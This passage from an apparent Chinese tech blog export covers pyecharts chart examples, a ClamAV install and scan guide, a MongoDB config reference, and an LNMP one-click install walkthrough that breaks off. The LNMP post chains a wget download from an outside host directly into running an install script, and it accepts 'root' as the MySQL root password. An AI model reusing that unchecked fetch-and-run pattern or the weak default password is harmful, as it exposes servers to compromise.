src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MTM2NTgzLTE0NjM0MjQzMjgucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>绘制3D散点图，并设置随机散点坐标，代码如下所示：</p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import Scatter3D\n\nimport random\n\ndata = [[random.randint(0, 100), random.randint(0, 100), random.randint(0, 100)] for _ in range(80)]\n\nrange_color = ['#313695', '#4575b4', '#74add1', '#abd9e9', '#e0f3f8', '#ffffbf',\n\n               '#fee090', '#fdae61', '#f46d43', '#d73027', '#a50026']\n\nscatter3D = Scatter3D(\"3D 散点图示例\", width=1200, height=600)\n\nscatter3D.add(\"\", data, is_visualmap=True, visual_range_color=range_color)\n\nscatter3D.render()   </code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p>输出结果非常美观，如下图所示：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MTUwNDEyLTExMDIxMTI0NDMucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-3-0\"><strong>5.仪表盘</strong></h3>\n\n<pre class=\"has\">\n<code>代码如下：\n\n# -*- coding:utf-8 -*-\n\nfrom pyecharts import Gauge\n\ng = Gauge(\"仪表盘图形\",\"副图标\")\n\ng.add(\"重大项目\", \"投资占比\", 66.66)\n\ng.show_config()\n\ng.render(\"g.html\")</code></pre>\n\n<p> </p>\n\n<p>输出图形如下所示：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MTU3NzcxLTUxMzIzNjIwNC5wbmc?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-4-0\"><strong>6.水球图</strong></h3>\n\n<p>代码如下：</p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import Liquid\n\nliquid = Liquid(\"水球图\")\n\nliquid.add(\"Liquid\", [0.8])\n\nliquid.show_config()\n\nliquid.render()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p>输出如下图所示：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MjA4NjkzLTI5NDU0OTcxMi5wbmc?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p>讲到这里基本的图形讲解完毕，更多知识推荐大家结合实际应用研究。</p>\n\n<p><strong>利用echarts画地图(热力图)(世界地图，省市地图，区县地图)</strong></p>\n\n<p><strong>世界地图</strong></p>\n\n<pre class=\"has\">\n<code>from pyecharts import Map\n\nvalue = [95.1, 23.2, 43.3, 66.4, 88.5]\n\nattr = [\"China\", \"Canada\", \"Brazil\", \"Russia\", \"United States\"]\n\nmap0 = Map(\"世界地图示例\", width=1200, height=600)\n\nmap0.add(\"世界地图\", attr, value, maptype=\"world\",  is_visualmap=True, visual_text_color='#000')\n\nmap0.render(path=\"世界地图.html\")</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MjI0NjMxLTYwMjY3ODY4Mi5wbmc?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-5-0\"><strong>中国地图</strong></h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>from pyecharts import Map\n\nprovince_distribution = {'河南': 45.23, '北京': 37.56, '河北': 21, '辽宁': 12, '江西': 6, '上海': 20, '安徽': 10, '江苏': 16, '湖南': 9,'浙江': 13, '海南': 2, '广东': 22, '湖北': 8, '黑龙江': 11, '澳门': 1, '陕西': 11, '四川': 7, '内蒙古': 3, '重庆': 3,'云南': 6, '贵州': 2, '吉林': 3, '山西': 12, '山东': 11, '福建': 4, '青海': 1, '天津': 1,'其他': 1}\n\nprovice = list(province_distribution.keys())\n\nvalues = list(province_distribution.values())\n\nmap = Map(\"中国地图\", '中国地图', width=1200, height=600)\n\nmap.add(\"\", provice, values, visual_range=[0, 50], maptype='china', is_visualmap=True,visual_text_color='#000')\n\nmap.render(path=\"中国地图.html\")</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MjM0MjQzLTE2OTUzMDY4NzkucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-6-0\"><strong>省市地图</strong></h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>from pyecharts import Map\n\nmap2 = Map(\"贵州地图\", '贵州', width=1200, height=600)\n\ncity = ['贵阳市', '六盘水市', '遵义市', '安顺市', '毕节市', '铜仁市', '黔西南布依族苗族自治州', '黔东南苗族侗族自治州', '黔南布依族苗族自治州']\n\nvalues2 = [1.07, 3.85, 6.38, 8.21, 2.53, 4.37, 9.38, 4.29, 6.1]\n\nmap2.add('贵州', city, values2, visual_range=[1, 10], maptype='贵州', is_visualmap=True, visual_text_color='#000')\n\nmap2.render(path=\"贵州地图.html\")</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MjQzMjUxLTE0ODg4MTk3OTIucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-7-0\"><strong>区县地图</strong></h3>\n\n<pre class=\"has\">\n<code>from pyecharts import Map\n\nquxian = ['观山湖区', '云岩区', '南明区', '花溪区', '乌当区', '白云区', '修文县', '息烽县', '开阳县', '清镇市']\n\nvalues3 = [3, 5, 7, 8, 2, 4, 7, 8, 2, 4]\n\nmap3 = Map(\"贵阳地图\", \"贵阳\", width=1200, height=600)\n\nmap3.add(\"贵阳\", quxian, values3, visual_range=[1, 10], maptype='贵阳', is_visualmap=True)\n\nmap3.render(path=\"贵阳地图.html\")</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MjUzNzM4LTE0MzY4NDU3ODMucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-8-0\"><strong>热力图</strong></h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>from pyecharts import Geo\n\nkeys = ['上海', '北京', '合肥', '哈尔滨', '广州', '成都', '无锡', '杭州', '武汉', '深圳', '西安', '郑州', '重庆', '长沙', '贵阳', '乌鲁木齐']\n\nvalues = [4.07, 1.85, 4.38, 2.21, 3.53, 4.37, 1.38, 4.29, 4.1, 1.31, 3.92, 4.47, 2.40, 3.60, 1.2, 3.7]\n\ngeo = Geo(\"全国主要城市空气质量热力图\", \"data from pm2.5\", title_color=\"#fff\",title_pos=\"left\",width=1200,height=600,background_color='#404a59')\n\ngeo.add(\"空气质量热力图\", keys, values, visual_range=[0, 5], type='effectScatter',visual_text_color=\"#fff\", symbol_size=15,is_visualmap=True, is_roam=True)  \n\n# type有scatter, effectScatter, heatmap三种模式可选，可根据自己的需求选择对应的图表模式\n\ngeo.render(path=\"全国主要城市空气质量热力图.html\")</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MzAyMjU0LTE4MzQ5NjgzMzIucG5n?x-oss-process=image/format,png\"></p>\n                                    </div>", "log_PostTime": 1584891025, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "ClamAV病毒查杀", "log_Intro": "ClamAV病毒查杀", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>一、介绍</h3>\n\n<p><code>Clam AntiVirus</code> 是一款 UNIX 下开源的 (GPL) 反病毒工具包，专为邮件网关上的电子邮件扫描而设计。该工具包提供了包含灵活且可伸缩的监控程序、命令行扫描程序以及用于自动更新数据库的高级工具在内的大量实用程序。该工具包的核心在于可用于各类场合的反病毒引擎共享库。<br><strong>主要使用ClamAV开源杀毒引擎检测木马、病毒、恶意软件和其他恶意的威胁</strong></p>\n\n<p>1.1、高性能</p>\n\n<p><code>ClamAV</code>包括一个多线程扫描程序守护程序，用于按需文件扫描和自动签名更新的命令行实用程序。</p>\n\n<p>1.2、格式支持</p>\n\n<p><code>ClamAV</code>支持多种文件格式，文件和存档解包以及多种签名语言。<code>PDF、JS、XLS、DOCX、PPT等</code></p>\n\n<h3>二、ClamAV安装</h3>\n\n<p>2.1、安装</p>\n\n<p><code>CentOS</code> 上安装，<code>clamav</code>包需要EPEL存储库</p>\n\n<p> </p>\n\n<pre>\n<code>yum install -y epel-release\nyum install -y clamav\n</code></pre>\n\n<p>2.2、更新</p>\n\n<p>为防止蠕虫传播，必须经常检查更新，<code>ClamAV</code>用户需要经常执行<code>freshclam</code>，检查间隔为30分钟。由于<code>ClamAV</code>用户数量过大，托管病毒数据库文件的服务器很容易过载。如果直接执行<code>freshclam</code>从公网更新会很慢，可以通过搭建私有镜像源进行内网分发<br><strong>默认更新</strong></p>\n\n<p> </p>\n\n<pre>\n<code>cat /etc/cron.d/clamav-update  \n##每三个小时执行更新\n0  */3 * * * root /usr/share/clamav/freshclam-sleep\n##更新病毒库\nfreshclam \n##病毒库文件\n/var/lib/clamav/daily.cvd\n/var/lib/clamav/main.cvd\n</code></pre>\n\n<p><strong>Private Local Mirrors</strong><br>\n为解决内网多客户端上<code>ClamAV</code>的更新，占用带宽和无法访问等问题，可以通过搭建本地镜像仓库进行分发，通过修改<code>freshclam.conf</code>配置，直接从内网服务器进行下载病毒数据库文件。</p>\n\n<h3>三、ClamAV扫描病毒</h3>\n\n<p><code>Clamscan</code> 可以扫描文件、用户目录或者整个系统</p>\n\n<p> </p>\n\n<pre>\n<code>##扫描文件\nclamscan targetfile\n##递归扫描home目录，并且记录日志\nclamscan -r -i /home  -l  /var/log/clamscan.log\n##递归扫描home目录，将病毒文件删除，并且记录日志\nclamscan -r -i /home  --remove  -l /var/log/clamscan.log\n##建议##扫描指定目录，然后将感染文件移动到指定目录，并记录日志\nclamscan -r -i /home  --move=/opt/infected  -l /var/log/clamscan.log\n</code></pre>\n\n<p><img alt=\"\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85ODYwMjkxLTc4MTIxNGM5OWZmNzI5NjAucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvNTQ5L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>image.png</p>\n\n<ul><li>扫描完成后，会将扫描详细信息列出</li>\n</ul><h3>四、周期自动扫描病毒</h3>\n\n<p> </p>\n\n<pre>\n<code>##每天凌晨11点进行文件扫描\ncrontab -e\n0 23 * * * root  /usr/local/bin/clamscan.sh\n##配置扫描文件\nvim /usr/local/clamscan.sh\nclamscan -r -i /home  --move=/opt/infected  -l /var/log/clamscan.log\n</code></pre>\n\n<h3>五、ClamAV与业务系统整合</h3>\n\n<p><img alt=\"\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85ODYwMjkxLTNiNzA0YWY3NWRmMTI5YmUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvOTA3L2Zvcm1hdC93ZWJw?x-oss-process=image/format,png\"></p>\n\n<p>image.png</p>\n\n<blockquote>\n<p>业务系统可以直接调用<code>clamav-scanner</code>服务来扫描上传的文件。</p>\n</blockquote>\n\n<p><strong>方案</strong></p>\n\n<ul><li>在业务系统安装<code>clamav-REST</code>服务</li>\n\t<li>部署<code>clamav-scanner server</code></li>\n\t<li>部署clamav更新服务器，或者直接上网更新</li>\n\t<li>部署clamav病毒库更新服务器</li>\n\t<li>部署clamav查杀文件所产生的日志服务器（可以直接放在服务端本地）</li>\n</ul><p>客户端上传文件，业务系统调用<code>clamav-rest</code>接口，让clamd主程序对文件进行扫描，并记录日志</p>\n\n<p><a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsolita%2Fclamav-rest\" rel=\"nofollow\">clamav-rest</a><br><a href=\"https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsolita%2Fclamav-java\" rel=\"nofollow\">clamav-java</a></p>\n                                    </div>", "log_PostTime": 1584891026, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "MongoDB之conf配置文件详解", "log_Intro": "MongoDB之conf配置文件详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>详细看一下mongodb配置文件。</p>\n\n<h2 id=\"mongodb.conf\">mongodb.conf</h2>\n\n<pre>\n<code># mongodb.conf\n\n# 数据库文件位置\ndbpath=/var/lib/mongodb\n\n#日志文件的路径\nlogpath=/var/log/mongodb/mongodb.log\n\n# 是否追加方式写入日志，默认True\nlogappend=true\n\n# 设置绑定ip\nbind_ip = 127.0.0.1\n# 设置端口\nport = 27017\n\n# 是否以守护进程方式运行，默认false\nfork = true\n\n# 启用日志文件，默认启用\njournal=true\n\n# 启用定期记录CPU利用率和 I/O 等待,默认false\n#cpu = true\n\n# 是否以安全认证方式运行，默认是不认证的非安全方式\n#noauth = true\n#auth = true\n\n# 详细记录输出，默认false\n#verbose = true\n\n#用于开发驱动程序时验证客户端请求\n#objcheck = true\n\n# # 启用数据库配额管理,默认false\n#quota = true\n\n# 设置oplog日志记录等级，默认0\n#   0=off (default)\n#   1=W\n#   2=R\n#   3=both\n#   7=W+some reads\n#oplog = 0\n\n# 是否打开动态调试项，默认false\n#nocursors = true\n\n# 忽略查询提示，默认false\n#nohints = true\n\n# 禁用http界面，默认为localhost：28017\n#nohttpinterface = true\n\n# 关闭服务器端脚本，这将极大的限制功能，默认false\n#noscripting = true\n\n# 关闭扫描表，任何查询将会是扫描失败\n#notablescan = true\n\n# 关闭数据文件预分配\n#noprealloc = true\n\n# 为新数据库指定.ns文件的大小，单位:MB\n# nssize = &lt;size&gt;\n\n# 用于Mongo监控服务器的Accout token。\n#mms-token = &lt;token&gt;\n\n# Mongo监控服务器的服务器名称。\n#mms-name = &lt;server-name&gt;\n\n# Mongo监控服务器的Ping间隔时间，即心跳\n#mms-interval = &lt;seconds&gt;\n\n# Replication Options\n\n# 设置主从复制参数\n#slave = true # 设置从节点\n#source = master.example.com # 指定从节点的主节点\n# Slave only: 指定要复制的单个数据库\n#only = master.example.com\n# or\n#master = true # 设置主节点\n#source = slave.example.com \n\n# 设置副本集的名字，所有的实例指定相同的名字属于一个副本集\nreplSet = name\n\n#pairwith = &lt;server:port&gt;\n\n# 仲裁服务器地址\n#arbiter = &lt;server:port&gt;\n\n# 默认为false，用于从实例设置。是否自动重新同步\n#autoresync = true\n\n# 指定的复制操作日志（OPLOG）的最大大小\n#oplogSize = &lt;MB&gt;\n\n# 限制复制操作的内存使用\n#opIdMem = &lt;bytes&gt;\n\n# 设置ssl认证\n# Enable SSL on normal ports\n#sslOnNormalPorts = true\n\n# SSL Key file and password\n#sslPEMKeyFile = /etc/ssl/mongodb.pem\n#sslPEMKeyPassword = pass</code></pre>\n\n<h2 id=\"一份常用的配置文件\">一份常用的配置文件</h2>\n\n<pre>\n<code># 普通配置文件\n# mongodb.conf\n\ndbpath=/var/lib/mongodb  \nlogpath=/var/log/mongodb/mongodb.log \npidfilepath=/var/log/mongodb/master.pid  \ndirectoryperdb=true  \nlogappend=true  \nbind_ip=127.0.0.1 \nport=27017  \nfork=true  \n\n# 集群配置文件\ndbpath=/var/lib/mongodb  \nlogpath=/var/log/mongodb/mongodb.log \npidfilepath=/var/log/mongodb/master.pid  \ndirectoryperdb=true  \nlogappend=true  \nreplSet=name  \nbind_ip=127.0.0.1 \nport=27017  \nfork=true  \nnoprealloc=true </code></pre>\n                                    </div>", "log_PostTime": 1584891027, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "LNMP一键安装", "log_Intro": "LNMP一键安装", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3 class=\"line\" style=\"padding:0px;font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.43;margin-bottom:14px;font-weight:200;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);margin-top:0px;\"><span style=\"font-size:16px;\">系统centos 7</span></h3><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">虚拟机测试完成<br style=\"margin:.2em;\">分开安装，配置起来很麻烦，因为要让nginx支持PHP必须进行一系列配置，<br style=\"margin:.2em;\">nginx整合php-fpm<br style=\"margin:.2em;\">从下面这个链接可以清楚的看到略显麻烦的配置过程<br style=\"margin:.2em;\"><a href=\"https://www.cnblogs.com/jecyhw/p/5504855.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://www.cnblogs.com/jecyhw/p/5504855.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">但是以下这种一键安装的方式，特别简单，只需花时间等待就可以了，大概需要1个多小时，但是省去了不少会碰到的报错和麻烦<br style=\"margin:.2em;\">参考文档链接：<a href=\"https://lnmp.org/install.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/install.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">我的安装步骤为<br style=\"margin:.2em;\">1.使用putty工具登陆服务器；<img alt=\"\" src=\"https://box.kancloud.cn/07d41db637669b19a78d854ec89ad0f6_515x145.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">2.登陆后运行：screen -S lnmp，提示screen: command not found 命令不存在，输入yum install screen安装<br style=\"margin:.2em;\">3.安装LNMP稳定版<br style=\"margin:.2em;\">输入<br style=\"margin:.2em;\">wget -c <a href=\"http://soft.vpser.net/lnmp/lnmp1.4.tar.gz\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">http://soft.vpser.net/lnmp/lnmp1.4.tar.gz</a> &amp;&amp; tar zxf lnmp1.4.tar.gz &amp;&amp; cd lnmp1.4 &amp;&amp; ./install.sh lnmp</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">（默认安装lnmp可不写，如需要安装LNMPA或LAMP，将./install.sh 后面的参数替换为lnmpa或lamp即可。如需更改网站和数据库目录先修改安装包目录下的 lnmp.conf 文件。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">如提示wget: command not found ，使用yum install wget 或 apt-get install wget 命令安装。）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">运行上述LNMP安装命令后，会出现如下提示：<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/0417cf51662a39858adaf802fdc5a1e8_351x182.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">目前提供了较多的MySQL、MariaDB版本和不安装数据库的选项，需要注意的是MySQL 5.6,5.7及MariaDB 10必须在1G以上内存的更高配置上才能选择！</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">输入对应MySQL或MariaDB版本前面的序号，回车进入下一步.<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/96111b737d077c2cc7e8d8730283e887_440x57.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">需要设置MySQL的root密码（不输入直接回车将会密码设置为root，我这里先回车默认了，后面可以另外修改的，修改方法上篇有）如果输入有错误需要删除时，可以按住Ctrl再按Backspace键进行删除(个别情况下是只需要Backspace键)。输入后回车进入下一步，如下图所示：<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/6b9591c3f30832a00ca07c6a99eb25b3_437x62.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">询问是否需要启用MySQL InnoDB，InnoDB引擎默认为开启，一般建议开启，直接回车或输入 y ，如果确定确实不需要该引擎可以输入 n，输入完成，回车进入下一步。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">注意：选择PHP7等高版本时需要自行确认是否与自己的程序兼容。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/cb25fb0569074499567ceb59757aa74a_335x159.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">输入要选择的PHP版本的序号，回车进入下一步，选择是否安装内存优化：</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">可以选择不安装、Jemalloc或TCmalloc，输入对应序号回车，直接回车为默认为不安装。我这里选择 1 不安装</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">如果是LNMPA或LAMP的话还会提示 我这里安装的是LNMP就没有这一步了<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/43289bcca2a31612e39d4a24eef2ae5f_392x90.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\">“Please enter Administrator Email Address:”，需要设置管理员邮箱，该邮箱会在报错时显示在错误页面上。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">再选择Apache版本</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">按提示输入对应版本前面的数字序号，回车。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">提示\"Press any key to install...or Press Ctrl+c to cancel\"后，按回车键确认开始安装。<br style=\"margin:.2em;\">LNMP脚本就会自动安装编译Nginx、MySQL、PHP、phpMyAdmin、Zend Optimizer这几个软件。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">安装时间可能会几十分钟到几个小时不等，主要是机器的配置网速等原因会造成影响。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4、安装完成，我这里就没有出现第5步了<br style=\"margin:.2em;\">如果显示Nginx: OK，MySQL: OK，PHP: OK</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">并且Nginx、MySQL、PHP都是running，80和3306端口都存在，并提示安装使用的时间及Install lnmp V1.4 completed! enjoy it.的话，说明已经安装成功。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">安装完成接下来开始使用就可以了，按添加虚拟主机教程，添加虚拟主机后可以使用sftp或ftp服务器上传网站代码，将域名解析到VPS或服务器的IP上，解析生效即可使用。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5、安装失败</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">如果出现类似上图的提示，有一个没安装成功表明安装失败！！需要用winscp或其他类似工具，将/root目录下面的lnmp-install.log下载下来，到LNMP支持论坛发帖注明你的系统发行版名称及版本号、32位还是64位等信息，并将lnmp-install.log压缩以附件形式上传到论坛，我们会通过日志查找错误，并给予相应的解决方法。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">以下都是关于其他附件的配置<br style=\"margin:.2em;\">默认LNMP是不安装FTP服务器的，如需要FTP服务器：<a href=\"https://lnmp.org/faq/ftpserver.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/faq/ftpserver.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">6、添加、删除虚拟主机及伪静态管理<br style=\"margin:.2em;\"><a href=\"https://lnmp.org/faq/lnmp-vhost-add-howto.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/faq/lnmp-vhost-add-howto.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">7、eAccelerator、xcache、memcached、imageMagick、ionCube、redis、opcache的安装<br style=\"margin:.2em;\"><a href=\"https://lnmp.org/faq/addons.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/faq/addons.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', 